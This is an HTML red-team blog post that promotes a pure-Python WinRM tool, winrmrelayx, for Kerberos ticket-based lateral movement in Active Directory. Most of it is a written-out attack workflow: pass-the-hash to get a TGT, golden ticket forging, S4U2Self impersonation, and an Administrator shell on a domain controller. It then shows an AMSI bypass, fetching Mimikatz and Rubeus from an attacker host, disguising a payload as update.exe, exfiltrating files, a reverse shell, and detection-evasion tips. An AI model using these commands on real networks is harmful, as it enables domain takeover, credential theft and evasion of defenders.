@@ -1,0 +1,787 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Taming the Dog with winrmrelayx for Adversarial Kerberos Attack // byt3n33dl3</title>
+    <link rel="icon" type="image/png" href="../images/logo.png">
+    <link rel="stylesheet" href="../theme/css/pure.css">
+    <link rel="stylesheet" href="../theme/css/styles.css">
+    <link rel="stylesheet" href="../theme/css/pygments.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+<div class="pure-g-r" id="layout">
+    <div class="sidebar pure-u">
+        <div class="cover-img"></div>
+        <div class="cover-body">
+            <header class="header">
+                <hgroup>
+                    <h1 class="brand-main"><a href="../index.html">AdverXarial</a></h1>
+                    <p class="tagline">Red Team // Adversary Emulator // Maintained by byt3n33dl3</p>
+                    <p class="links">
+                        <a href="../pages/about.html">About</a>
+                        <a href="https://byt3n33dl3.substack.com/">Archives</a>
+                    </p>
+                    <p class="social">
+                        <a href="https://github.com/byt3n33dl3/">
+                            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/github.svg" width="20" height="20" alt="GitHub">
+                        </a>
+                        <a href="#">
+                            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/linkedin.svg" width="20" height="20" alt="LinkedIn">
+                        </a>
+                        <a href="https://x.com/byt3n33dl3/">
+                            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/twitter.svg" width="20" height="20" alt="Twitter">
+                        </a>
+                    </p>
+                </hgroup>
+            </header>
+        </div>
+    </div>
+
+    <div class="pure-u">
+        <div class="content">
+            <div class="post-header">
+                <img src="../images/logo.png" alt="avatar" class="post-avatar">
+                <div class="post-meta-wrapper">
+                    <h2 class="post-author"><a href="../pages/byt3n33dl3.html">byt3n33dl3</a></h2>
+                    <p class="post-date">Published Fri 14 November 2025</p>
+                </div>
+            </div>
+
+            <p class="back-link"><a href="../index.html">← Home</a></p>
+
+            <article class="post-content">
+                <h1>Taming the Dog with winrmrelayx for Adversarial Kerberos Attack</h1>
+                <p class="post-tags">Tags: <a href="#">Red Teaming</a> · <a href="#">Active Directory</a> · <a href="#">Evasion</a></p>
+
+                <p class="post-meta">Blog released: 2025 Fri 14 Nov.</p>
+
+                <h1>Overview</h1>
+                
+                <p>Sometimes, Kerberos authentication in commercial Pentesting software has been a pain.</p> 
+
+                <div class="video-container">
+                <img alt="kerberos-image" width="40%" src="../images/kerberos-image-no-background.png"></iframe>
+                </div><br>
+                
+                <p>In a rare case when we have valid TGT, the domain controller is reachable, your target is right there but your tools refuse to authenticate. The error messages are <code>cryptic</code> and the configuration requirements are extensive, and <ins>the dog won't behave.</ins></p>
+
+                <p>This tool and blog have the solution for technical challenges of <ins>Kerberos-based WinRM access</ins> and compares implementation approaches across different lateral movement tools.</p> 
+                
+                <p>We'll focus on <ins>why certain implementations</ins> work in adversarial scenarios where others fail, particularly when system configuration is limited or unavailable.</p>
+
+                <h1>The Authentication Challenge</h1>
+
+                <p>Windows Remote Management are one of an attractive target for red teamers, such as SMB, LDAP, etc. Commonly enabled in enterprise AD environments, it uses encrypted channels by default, and often generates less suspicious traffic than SMB-based methods.</p> 
+                
+                <p>Happened however, leveraging <a href="https://github.com/kurokobo/awx-on-k3s/blob/main/tips/use-kerberos.md"><ins>WinRM with Kerberos</ins></a> authentication presents specific technical hurdles.</p>
+
+                <h2>Traditional Kerberos Authentication Flow</h2>
+
+                <p>Standard Kerberos authentication for WinRM follows this sequence:</p>
+
+                <ol>
+                    <li>Client possesses TGT from the KDC.</li>
+                    <li>Client requests a Service Ticket for the target WinRM service.</li>
+                    <li>KDC validates the TGT and issues a Service Ticket.</li>
+                    <li>Client presents Service Ticket to WinRM service.</li>
+                    <li>Service validates ticket with KDC and grants access.</li>
+                </ol>
+
+                <p>In legitimate enterprise environments, this process is transparent. Workstations are domain-joined while Kerberos configuration is managed via Group Policy, and realm resolution happens automatically.</p>
+
+                <p>In adversarial scenarios, these assumptions <ins>don't hold.</ins></p>
+
+                <h1>The System Configuration Dependency Problem</h1>
+
+                <p>Most Kerberos implementations rely on system-level configuration, primarily the <code>krb5.conf</code> file. This creates challenges in offensive operations.</p>
+
+                <h2>Configuration Requirements</h2>
+
+                <p>A typical <code>krb5.conf</code> for Kerberos authentication requires multiple sections:</p>
+
+                <pre><code class="language-plaintext">[libdefaults]
+    dns_lookup_kdc = false
+    dns_lookup_realm = false
+    default_realm = bullet.local
+
+[realms]
+    bullet.local = {
+        kdc = DC01.bullet.local
+        admin_server = DC01.bullet.local
+        default_domain = bullet.local
+    }
+
+[domain_realm]
+    .bullet.local = bullet.local
+    bullet.local = bullet.local</code></pre>
+
+                <p>This configuration explicitly defines the KDC location mainly, followed by realm mappings, and domain relationships. Tools that depend on system Kerberos libraries require this file to be properly configured before authentication attempts.</p>
+
+                <h2>Why This Matters in Red Team Operations</h2>
+
+                <p>Consider these common scenarios:</p>
+
+                <ul>
+                    <li>Operating from containerized attack platforms where <code>/etc/krb5.conf</code> may not persist.</li>
+                    <li><ins>Pivoting through multiple domains</ins> where configuration must change frequently.</li>
+                    <li>Working in environments where you lack permissions to modify system files.</li>
+                    <li>Dealing with non-standard realm names or <ins>complex trust</ins> relationships.</li>
+                    <li>Attacking from systems where <code>Kerberos packages aren't installed.</code></li>
+                </ul>
+
+                <p>In these situations, tools requiring system-level Kerberos configuration become impractical.</p>
+
+                <h1>Comparing Authentication Implementations</h1>
+
+                <p>This are the different tools handle Kerberos authentication, focus on architectural approaches rather than subjective quality assessments.</p>
+
+                <h2>System Library Approach</h2>
+
+                <p>Some tools leverage system Kerberos libraries through language-specific bindings. The <code>Ruby GSSAPI</code> implementation, for example, provides Kerberos functionality by wrapping system libraries.</p>
+
+                <p>Architecture:</p>
+
+                <pre><code class="language-plaintext">Application → Language Binding → GSSAPI Libraries → krb5.conf</code></pre>
+
+                <p>The <code>krb5.conf</code> are somewhere imporant containing:</p>
+
+                <pre><cdoe>System Kerberos Config
+Realm Resolution
+KDC Discovery</cdoe></pre>
+
+                <p>Characteristics:</p>
+
+                <ul>
+                    <li>Relies on properly configured system Kerberos environment</li>
+                    <li>Requires <code>krb5.conf</code> with correct realm definitions</li>
+                    <li>Depends on system Kerberos packages being installed</li>
+                    <li>Realm resolution handled by underlying libraries</li>
+                    <li>Works well in properly configured enterprise environments</li>
+                </ul>
+
+                <p>One of approach that are solid and made profit!! for legitimate administrative tasks where the system is properly joined to a domain. For adversarial operations, it introduces dependencies that may not be practical to satisfy.</p>
+
+                <h2>Pure-Python Implementation Approach</h2>
+
+                <p>Alternative implementations use pure-Python Kerberos handling, built on frameworks like Impacket kit.</p> 
+                
+                <p>This architectural choice eliminates system dependencies.</p>
+
+                <p>Architecture:</p>
+
+                <pre><code class="language-plaintext">Application → Impacket Kerberos → Direct Ticket Parsing</code></pre>
+
+                <p>The DTP have:</p>
+
+                <pre><code>Extract Realm from TGT
+Construct TGS Request
+Direct KDC Communication</code></pre>
+
+                <p>Characteristics:</p>
+
+                <ul>
+                    <li>Reads ticket cache files directly without system library involvement.</li>
+                    <li>Extracts realm information from the ticket itself.</li>
+                    <li>Constructs Kerberos protocol messages in pure Python.</li>
+                    <li>Communicates directly with KDC using extracted information.</li>
+                    <li><ins>No requirement, or anything</ins> to do for <code>krb5.conf</code> or system packages.</li>
+                </ul>
+
+                <p>This approach trades the convenience of system integration for operational flexibility in adversarial scenarios.</p>
+
+                <h1>Practical Demonstration: Authentication Flow Comparison</h1>
+
+                <p>Let's examine actual authentication attempts against a test environment to understand these differences concretely.</p>
+
+                <h2>Environment Setup</h2>
+
+                <p>Test environment configuration:</p>
+
+                <pre><code class="language-plaintext">Domain: bullet.local
+Domain Controller: DC01.bullet.local (192.168.282.83)
+Target User: Administrator
+Authentication Method: Kerberos (TGT-based)</code></pre>
+
+                <h2>Obtaining Initial Credentials</h2>
+
+                <p>First, we acquire a Ticket-Granting Ticket using obtained NTLM hash:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ getTGT.py bullet.local/administrator -dc-ip 192.168.282.83 -no-pass -hashes :db346d691d7acc4dc2625db19f9e3f52</code></pre>
+
+                <p>This generates <code>administrator.ccache</code> containing our TGT. We export it for tool consumption:</p>
+
+                <pre><code class="language-bash">export KRB5CCNAME=administrator.ccache</code></pre>
+
+                <p>At this point, we have everything theoretically needed for Kerberos authentication: a valid TGT, knowledge of the KDC location, and network access to the target.</p>
+
+                <h2>Attempt 1: System Library-Based Authentication</h2>
+
+                <p>With properly configured <code>krb5.conf</code> and valid TGT exported, we attempt authentication using a tool that relies on system Kerberos libraries:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i bullet.local -u Administrator -r DC01.bullet.local</code></pre>
+
+                <p>The configuration file is properly set up:</p>
+
+                <pre><code class="language-plaintext">[realms]
+    bullet.local = {
+        kdc = DC01.bullet.local
+        admin_server = DC01.bullet.local
+        default_domain = bullet.local
+    }</code></pre>
+
+                <p>Despite correct configuration, authentication fails:</p>
+
+                <pre><code class="language-plaintext">Warning: User is not needed for Kerberos auth. Ticket will be used
+Info: Establishing connection to remote endpoint
+Error: An error of type GSSAPI::GssApiError happened
+gss_init_sec_context did not return GSS_S_COMPLETE
+Cannot find KDC for realm "BULLET.LOCAL"
+Error: Exiting with code 1</code></pre>
+
+                <p>The error indicates realm resolution failure despite proper configuration. This occurs because the GSSAPI library searches for uppercase realm <code>BULLET.LOCAL</code> while the configuration defines lowercase <code>bullet.local</code>.</p> 
+                
+                <p>This case sensitivity issue in the binding <ins>between application and system</ins> libraries prevents successful authentication.</p>
+
+                <h2>Other Fail Cases:</h2>
+
+                <pre><code class="language-plaintext">┌──(root㉿kali)-[/]
+└─# export KRB5CCNAME=Administrator.ccache
+
+┌──(root㉿kali)-[/]
+└─# evil-winrm -i 192.168.221.66 -u Administrator -r dc02.tesla.corp --port 5986
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: User is not needed for Kerberos auth. Ticket will be used
+                                        
+Info: Establishing connection to remote endpoint
+                                        
+Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspecified GSS failure.  Minor code may provide more information
+Server not found in Kerberos database
+
+                                        
+Error: Exiting with code 1</code></pre>
+
+                <div class="video-container">
+                <img alt="kerberos-image-error" width="80%" src="../images/kerberos-error.png"></iframe>
+                </div><br>
+
+                <p>Which this could happen due to <ins>no Kerberos ccache</ins> on the Database, <a href="https://github.com/byt3n33dl3/winrmrelayx/blob/main/local/src/writeups.md">example on my GitHub</a> winrmrelayx.</p>
+                
+                <h2>Attempt 2: Pure-Python Implementation</h2>
+
+                <p>Using an alternative implementation that doesn't rely on system Kerberos libraries:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ python3 evil_winrmrelayx.py -ssl -port 5986 -k -no-pass DC01.bullet.local -dc-ip 192.168.282.83</code></pre>
+
+                <p>The tool extracts necessary information directly from the cached ticket:</p>
+
+                <pre><code class="language-plaintext">[*] '-target_ip' not specified, using DC01.bullet.local
+[*] '-url' not specified, using https://DC01.bullet.local:5986/wsman
+[*] using domain and username from ccache: BULLET.LOCAL\administrator
+[*] '-spn' not specified, using HTTP/DC01.bullet.local@BULLET.LOCAL
+[*] requesting TGS for HTTP/DC01.bullet.local@BULLET.LOCAL</code></pre>
+
+                <p>Authentication succeeds and we receive a shell:</p>
+
+                <pre><code class="language-powershell">PS C:\Users\Administrator\Documents> whoami
+bullet\administrator</code></pre>
+
+                <p><ins>The critical difference:</ins> this implementation reads realm information directly from the TGT structure rather than attempting to resolve it through system configuration files.</p>
+
+                <p>Full-Interaction:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ python3 evil_winrmrelayx.py -ssl -port 5986 -k -no-pass DC01.bullet.local -dc-ip 192.168.282.83
+[*] '-target_ip' not specified, using DC01.bullet.local
+[*] '-url' not specified, using https://DC01.bullet.local:5986/wsman
+[*] using domain and username from ccache: BULLET.LOCAL\administrator
+[*] '-spn' not specified, using HTTP/DC01.bullet.local@BULLET.LOCAL
+[*] requesting TGS for HTTP/DC01.bullet.local@BULLET.LOCAL
+
+Ctrl+D to exit, Ctrl+C will try to interrupt the running pipeline gracefully
+This is not an interactive shell! If you need to run programs that expect
+inputs from stdin, or exploits that spawn cmd.exe, etc., pop a !revshell
+
+Special !bangs:
+  !download RPATH [LPATH]          # downloads a file or directory (as a zip file); use 'PATH'
+                                   # if it contains whitespace
+
+  !upload [-xor] LPATH [RPATH]     # uploads a file; use 'PATH' if it contains whitespace, though use iwr
+                                   # if you can reach your ip from the box, because this can be slow;
+                                   # use -xor only in conjunction with !psrun/!netrun
+
+  !amsi                            # amsi bypass, run this right after you get a prompt
+
+  !psrun [-xor] URL                # run .ps1 script from url; uses ScriptBlock smuggling, so no !amsi patching is
+                                   # needed unless that script tries to load a .NET assembly; if you can't reach
+                                   # your ip, !upload with -xor first, then !psrun -xor 'c:\foo\bar.ps1' (needs absolute path)
+
+  !netrun [-xor] URL [ARG] [ARG]   # run .NET assembly from url, use 'ARG' if it contains whitespace;
+                                   # !amsi first if you're getting '...program with an incorrect format' errors;
+                                   # if you can't reach your ip, !upload with -xor first then !netrun -xor 'c:\foo\bar.exe' (needs absolute path)
+
+  !revshell IP PORT                # pop a revshell at IP:PORT with stdin/out/err redirected through a socket; if you can't reach your ip and you
+                                   # you need to run an executable that expects input, try:
+                                   # PS> Set-Content -Encoding ASCII 'stdin.txt' "line1`nline2`nline3"
+                                   # PS> Start-Process some.exe -RedirectStandardInput 'stdin.txt' -RedirectStandardOutput 'stdout.txt'
+
+  !log                             # start logging output to winrmexec_[timestamp]_stdout.log
+  !stoplog                         # stop logging output to winrmexec_[timestamp]_stdout.log
+
+PS C:\Users\Administrator\Documents> whoami
+bullet\administrator</code></pre>
+
+                <h1>Technical Analysis: Why Pure-Python Succeeds</h1>
+
+                <p>The key to understanding this success lies in how Kerberos tickets store information.</p>
+
+                <div class="video-container">
+                <img alt="kerberos-tgt-content" width="60%" src="../images/tgt-content.png"></iframe>
+                </div><br>
+
+                <h2>TGT Structure and Information Extraction</h2>
+
+                <p>A Kerberos TGT contains all information needed for subsequent authentication:</p>
+
+                <pre><code class="language-plaintext">TGT Structure:
+├── Client Principal (user@REALM)
+├── Service Principal (krbtgt/REALM@REALM)
+├── Session Key
+├── Ticket Lifetime
+├── Encryption Type
+└── Ticket Flags</code></pre>
+
+                <p>The realm is embedded in the principal names.</p> 
+                
+                <p>A pure-Python implementation can extract this directly:</p>
+
+                <pre><code class="language-python">ccache = CCache.loadFile(os.getenv('KRB5CCNAME'))
+domain = ccache.principal.realm['data']
+username = ccache.principal.components[0]['data']</code></pre>
+
+                <p>Once extracted, this information enables direct TGS requests:</p>
+
+                <pre><code class="language-python">spn = f'HTTP/{target}@{realm}'
+tgs = getKerberosTGS(spn, domain, kdcHost, tgt, cipher, sessionKey)</code></pre>
+
+                <p>No external configuration file is consulted. The ticket itself provides all necessary context.</p>
+
+                <h2>Eliminating Configuration Dependencies</h2>
+
+                <p>This approach removes several points of failure:</p>
+
+                <ul>
+                    <li>No parsing of <code>krb5.conf</code> required.</li>
+                    <li>No realm resolution through system libraries.</li>
+                    <li>No case sensitivity issues.</li>
+                    <li>No dependency on system Kerberos packages.</li>
+                    <li>No requirement for administrative access to modify configuration.</li>
+                </ul>
+
+                <p>The trade-off is that the tool must implement complete Kerberos protocol handling, but frameworks like Impacket provide this functionality in a battle-tested library.</p>
+
+                <h1>Practical Advantages in Red Team Operations</h1>
+
+                <p>These technical differences translate to operational benefits in several scenarios.</p>
+
+                <h2>Multi-Domain Engagements</h2>
+
+                <p>When pivoting across multiple domains, system-dependent tools require reconfiguration for each domain:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ vi /etc/krb5.conf
+
+┌──(kali㉿kali)-[~]
+└─$ getTGT.py corp.local/user1 ...
+
+┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i corp.local ...</code></pre>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ vi /etc/krb5.conf
+
+┌──(kali㉿kali)-[~]
+└─$ getTGT.py subsidiary.local/user2 ...
+
+┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i subsidiary.local ...</code></pre>
+
+                <p>Pure-Python implementations with winrmrelayx eliminate this overhead:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ getTGT.py corp.local/user1 ...
+
+┌──(kali㉿kali)-[~]
+└─$ export KRB5CCNAME=user1.ccache
+
+┌──(kali㉿kali)-[~]
+└─$ python3 evil_winrmrelayx.py -k -no-pass DC01.corp.local ...</code></pre>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ getTGT.py subsidiary.local/user2 ...
+
+┌──(kali㉿kali)-[~]
+└─$ export KRB5CCNAME=user2.ccache
+
+┌──(kali㉿kali)-[~]
+└─$ python3 evil_winrmrelayx.py -k -no-pass DC02.subsidiary.local ...</code></pre>
+
+                <p>The tool automatically adapts to whichever domain the current ticket references.</p>
+
+                <h2>Containerized Attack Platforms</h2>
+
+                <p>Docker-based attack platforms may not persist <code>/etc/krb5.conf</code> between container restarts. Tools that can extract configuration from tickets eliminate this concern.</p>
+
+                <h2>Restricted Environments</h2>
+
+                <p>In scenarios where you've obtained a shell with limited privileges, modifying system Kerberos configuration may be impossible.</p> 
+                
+                <div class="video-container">
+                <img alt="kerberos-auth-context" width="100%" src="../images/kerberos-auth-processes.png"></iframe>
+                </div><br>
+                
+                <p>This Kerberos <a href="https://www.rcdevs.com/kerberos_authentication/"><ins>Ticket-based authentication</ins></a> works regardless of local configuration.</p>
+
+                <h2>Rapid Credential Testing</h2>
+
+                <p>When testing multiple sets of credentials, avoiding configuration file modifications speeds operations significantly. <ins>Each TGT is self-contained</ins> with its associated realm information.</p>
+
+                <h1>Additional Capabilities in <a href="https://github.com/byt3n33dl3/winrmrelayx/"><ins>winrmrelayx</ins></a></h1>
+
+                <p>Beyond pure authentication handling, the tool provides features specifically useful for post-exploitation scenarios.</p>
+
+                <h2>AMSI Bypass Integration</h2>
+
+                <p>Built-in AMSI bypass functionality for initial access:</p>
+
+                <pre><code class="language-powershell">PS C:\Users\Administrator\Documents> !amsi</code></pre>
+
+                <p>This <code>patches AMSI</code> in the current session without requiring manual PowerShell commands or external scripts.</p>
+
+                <h2>Remote Script Execution</h2>
+
+                <p>Execute PowerShell scripts directly from HTTP URLs using <ins>ScriptBlock smuggling:</ins></p>
+
+                <pre><code class="language-powershell">PS C:\Users\Administrator\Documents> !psrun http://192.168.282.100/Invoke-Mimikatz.ps1</code></pre>
+
+                <p>The script is loaded and executed without touching disk. If network access from the target to your host isn't available, <code>XOR encoding</code> allows upload and execution:</p>
+
+                <pre><code class="language-powershell">PS C:\Users\Administrator\Documents> !upload -xor Invoke-Mimikatz.ps1 C:\Temp\script.ps1</code></pre>
+
+                <pre><code class="language-powershell">>PS C:\Users\Administrator\Documents> !psrun -xor C:\Temp\script.ps1</code></pre>
+
+                <h2>.NET Assembly Execution</h2>
+
+                <p>Load and execute <code>.NET assemblies</code> from URLs or local paths:</p>
+
+                <pre><code class="language-powershell">PS C:\Users\Administrator\Documents> !netrun http://192.168.282.100/Rubeus.exe kerberoast</code></pre>
+
+                <p>This uses in-memory assembly loading to execute tools without writing executables to disk.</p>
+
+                <h2>File Transfer Capabilities</h2>
+
+                <p>Upload and download functionality built into the shell:</p>
+
+                <pre><code class="language-powershell">PS C:\Users\Administrator\Documents> !download C:\Users\Administrator\Desktop\secrets.txt</code></pre>
+
+                <pre><code class="language-powershell">PS C:\Users\Administrator\Documents> !upload payload.exe C:\Temp\update.exe</code></pre>
+
+                <h2>Reverse Shell Integration</h2>
+
+                <p>For situations requiring true interactive shells with stdin:</p>
+
+                <pre><code class="language-powershell">PS C:\Users\Administrator\Documents> !revshell 192.168.282.100 9001</code></pre>
+
+                <p>This spawns a reverse shell with all standard streams redirected through a network socket, <ins>useful for running interactive programs that WinRM's command-based</ins> approach can't handle effectively.</p>
+
+                <h1>Comparing Feature Sets</h1>
+
+                <p>Different WinRM clients emphasize different capabilities based on their design goals.</p>
+
+                <h2>Evil-WinRM</h2>
+
+                <p><strong>Strengths:</strong></p>
+                <ul>
+                    <li>Mature Ruby implementation with extensive testing.</li>
+                    <li>Rich post-exploitation features including PowerShell menu system.</li>
+                    <li>Built-in script loading and <code>.NET</code> assembly execution.</li>
+                    <li>Cross-platform support through Ruby.</li>
+                    <li>Active development and community support.</li>
+                </ul>
+
+                <p><strong>Considerations:</strong></p>
+                <ul>
+                    <li>Kerberos support depends on <ins>system GSSAPI</ins> configuration.</li>
+                    <li>Requires <code>krb5.conf</code> properly configured for ticket-based auth.</li>
+                    <li>Ruby gem dependencies may require additional setup.</li>
+                </ul>
+
+                <p><strong>Ideal Use Cases:</strong></p>
+                <ul>
+                    <li><ins>Standard NTLM-based</ins> authentication scenarios.</li>
+                    <li>Environments where Kerberos configuration is manageable.</li>
+                    <li>Post-exploitation when rich Ruby ecosystem is valuable.</li>
+                </ul>
+
+                <h2>winrmrelayx</h2>
+
+                <p><strong>Strengths:</strong></p>
+                <ul>
+                    <li>Pure-Python Kerberos implementation <a href="https://techcommunity.microsoft.com/blog/windowsservernewsandbestpractices/removal-of-des-in-kerberos-for-windows-server-and-client/4386903"><ins>removes system</ins></a> dependencies.</li>
+                    <li>Direct ticket cache parsing enables configuration-free authentication.</li>
+                    <li>Impacket integration provides robust credential handling.</li>
+                    <li>Built-in <code>AMSI bypass</code> and memory-based execution.</li>
+                    <li>Nim-based <ins>implant capabilities for C2</ins> integration.</li>
+                </ul>
+
+                <p><strong>Considerations:</strong></p>
+                <ul>
+                    <li>Newer tool with smaller community.</li>
+                    <li>Feature set <ins>focused on specific operational</ins> needs.</li>
+                    <li>Python dependency may be larger than Ruby in some environments.</li>
+                </ul>
+
+                <p><strong>Ideal Use Cases:</strong></p>
+                <ul>
+                    <li>Ticket-based authentication scenarios.</li>
+                    <li>Multi-domain engagements requiring frequent realm changes.</li>
+                    <li>Containerized or restricted environments.</li>
+                    <li>Operations leveraging Impacket toolkit extensively.</li>
+                </ul>
+
+                <h2>Impacket psexec/wmiexec</h2>
+
+                <p><strong>Strengths:</strong></p>
+                <ul>
+                    <li>Battle-tested <ins>lateral movement</ins> tools.</li>
+                    <li>Excellent Kerberos support through same framework.</li>
+                    <li>Part of comprehensive offensive toolkit.</li>
+                </ul>
+
+                <p><strong>Considerations:</strong></p>
+                <ul>
+                    <li>Uses <ins>SMB/RPC protocols</ins> which may be more heavily monitored.</li>
+                    <li>SMB port 445 may be blocked <ins>where WinRM 5985/5986</ins> is open.</li>
+                    <li>Command-line oriented rather than interactive shell.</li>
+                </ul>
+
+                <p><strong>Ideal Use Cases:</strong></p>
+                <ul>
+                    <li>Environments where SMB access is available.</li>
+                    <li>Single-command execution scenarios.</li>
+                    <li>Integration with other Impacket tools.</li>
+                </ul>
+
+                <h1>Protocol-Level Detection Considerations</h1>
+
+                <p>Understanding how different lateral movement methods appear to defenders helps in protocol selection.</p>
+
+                <h2>SMB-Based Methods</h2>
+
+                <p>Tools like psexec and wmiexec generate distinctive traffic:</p>
+
+                <pre><code class="language-plaintext">SMB Protocol Events:
+- SMB connection to IPC$
+- Service installation or WMI namespace access
+- Command execution through service or WMI
+- Output retrieval through SMB shares or WMI
+
+Common Detection Points:
+- Event ID 7045 (Service Installation)
+- Event ID 4688 (Process Creation from Services)
+- Network traffic to port 445
+- SMB named pipe access patterns</code></pre>
+
+                <h2>WinRM-Based Methods</h2>
+
+                <p>WinRM generates different artifacts:</p>
+
+                <pre><code class="language-plaintext">WinRM Protocol Events:
+- HTTPS/HTTP connection to port 5986/5985
+- WSMan authentication
+- PowerShell process spawning
+- Command execution in PowerShell context
+
+Common Detection Points:
+- Event ID 4624 (Logon Type 3)
+- Event ID 4648 (Explicit Credential Logon)
+- PowerShell script block logging
+- Network traffic to WinRM ports</code></pre>
+
+                <p>Neither approach is inherently more detectable, <ins><strong>mature defensive programs monitor both.</strong></ins> Protocol choice often depends more on which ports are accessible than detection concerns.</p>
+
+                <h1>Implementation Deep Dive: Ticket Handling</h1>
+
+                <p>For those interested in the technical implementation, here's how pure-Python Kerberos ticket handling works in practice.</p>
+
+                <h2>CCache File Structure</h2>
+
+                <div class="video-container">
+                <img alt="kerberos-rfc4120" width="80%" src="../images/rfc4120.png"></iframe>
+                </div><br>
+
+                <p>Kerberos credential caches use a binary format defined in <a href="https://datatracker.ietf.org/doc/html/rfc4120"><code><ins>RFC 4120.</ins></code></a> The structure contains:</p>
+
+                <pre><code class="language-plaintext">CCache File Structure:
+├── File Format Version
+├── Header (optional, version 4+)
+├── Primary Principal
+│   ├── Name Type
+│   ├── Realm
+│   └── Components (username, etc.)
+└── Credentials List
+    └── For each credential:
+        ├── Client Principal
+        ├── Server Principal
+        ├── Encryption Key
+        ├── Authentication Time
+        ├── Start Time
+        ├── End Time
+        └── Ticket Data</code></pre>
+
+                <h2>Parsing and Extraction</h2>
+
+                <p>Impacket's CCache implementation parses this structure and provides access to embedded information:</p>
+
+                <pre><code class="language-python">from impacket.krb5.ccache import CCache
+
+ccache = CCache.loadFile(ticket_path)
+
+realm = ccache.principal.realm['data'].decode('utf-8')
+username = ccache.principal.components[0]['data'].decode('utf-8')
+
+credential = ccache.credentials[0]
+tgt = credential['ticket'].getData()
+session_key = credential['key']['keyvalue']</code></pre>
+
+                <p>With this information extracted, the tool can construct a TGS request without consulting any external configuration.</p>
+
+                <h2>TGS Request Construction</h2>
+
+                <p>Once realm and principal information is available, requesting a Service Ticket becomes straightforward:</p>
+
+                <pre><code class="language-python">from impacket.krb5.kerberosv5 import getKerberosTGS
+
+service_principal = f'HTTP/{target_host}@{realm}'
+
+tgs, cipher, session_key_tgs = getKerberosTGS(
+    service_principal,
+    domain,
+    kdc_host,
+    tgt,
+    cipher,
+    session_key
+)</code></pre>
+
+                <p>This TGS can then be used for WinRM authentication <ins>through standard SPNEGO negotiation.</ins></p>
+
+                <h1>Operational Workflows</h1>
+
+                <p>Let's examine complete workflows for common scenarios.</p>
+
+                <h2>Scenario 1: Basic Domain Access</h2>
+
+                <p>Starting from NTLM hash obtained through credential dumping:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ getTGT.py bullet.local/administrator -dc-ip 192.168.282.83 -hashes :db346d691d7acc4dc2625db19f9e3f52
+
+┌──(kali㉿kali)-[~]
+└─$ export KRB5CCNAME=administrator.ccache
+
+┌──(kali㉿kali)-[~]
+└─$ python3 evil_winrmrelayx.py -ssl -port 5986 -k -no-pass DC01.bullet.local -dc-ip 192.168.282.83</code></pre>
+
+                <p>Result: Direct shell access using only the NTLM hash, no plaintext password required.</p>
+
+                <h2>Scenario 2: Golden Ticket Usage</h2>
+
+                <p>After obtaining KRBTGT hash and forging a Golden Ticket:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ ticketer.py -nthash (krbtgt_hash) -domain-sid (domain_sid) -domain bullet.local administrator
+
+┌──(kali㉿kali)-[~]
+└─$ export KRB5CCNAME=administrator.ccache
+
+┌──(kali㉿kali)-[~]
+└─$ python3 evil_winrmrelayx.py -ssl -port 5986 -k -no-pass DC01.bullet.local -dc-ip 192.168.282.83</code></pre>
+
+                <p>The forged ticket is accepted and processed identically to legitimate tickets.</p>
+
+                <h2>Scenario 3: Cross-Domain Trust Exploitation</h2>
+
+                <p>When exploiting domain trust relationships:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ getTGT.py child.bullet.local/user -dc-ip 192.168.282.85 -hashes :hash
+
+┌──(kali㉿kali)-[~]
+└─$ export KRB5CCNAME=user.ccache</code></pre>
+
+                <p>In other ways:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ getST.py -spn HTTP/DC01.bullet.local -impersonate Administrator child.bullet.local/user
+
+┌──(kali㉿kali)-[~]
+└─$ export KRB5CCNAME=Administrator.ccache
+
+┌──(kali㉿kali)-[~]
+└─$ python3 evil_winrmrelayx.py -ssl -port 5986 -k -no-pass DC01.bullet.local -dc-ip 192.168.282.83</code></pre>
+
+                <p>This demonstrates <a href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse"><ins>S4U2Self abuse</ins></a> across trust boundaries, with WinRM access in the parent domain using credentials from the child domain.</p>
+
+                <h1>Best Practices and Operational Security</h1>
+
+                <p>Several considerations improve operational security when using Kerberos-based access methods.</p>
+
+                <h2>Ticket Lifetime Management</h2>
+
+                <p>Kerberos tickets have defined validity periods. Monitor ticket expiration:</p>
+
+                <pre><code class="language-bash">klist -c administrator.ccache</code></pre>
+
+                <p>Tickets typically <ins>expire after 10 hours</ins> by default. Renew or obtain fresh tickets before expiration to maintain access.</p>
+
+                <h2>Network Indicators</h2>
+
+                <p>Kerberos generates distinctive network patterns. Using Kerberos authentication from unusual sources may trigger alerts. Consider:</p>
+
+                <ul>
+                    <li>Authentication from IP addresses not associated with domain workstations.</li>
+                    <li>Unusual timing pattern.s</li>
+                    <li>Rapid ticket requests suggesting automated scanning.</li>
+                    <li>TGS <ins>requests for services the account</ins> doesn't typically access.</li>
+                </ul>
+                
+                <p>I think that's it for everything, continued later with <ins>Part 02</ins> if needed.
